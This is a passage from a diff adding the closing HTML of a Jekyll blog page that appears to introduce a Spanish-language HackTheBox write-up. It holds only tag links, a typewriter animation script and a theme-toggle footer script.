class="set-1">python,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada Search';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
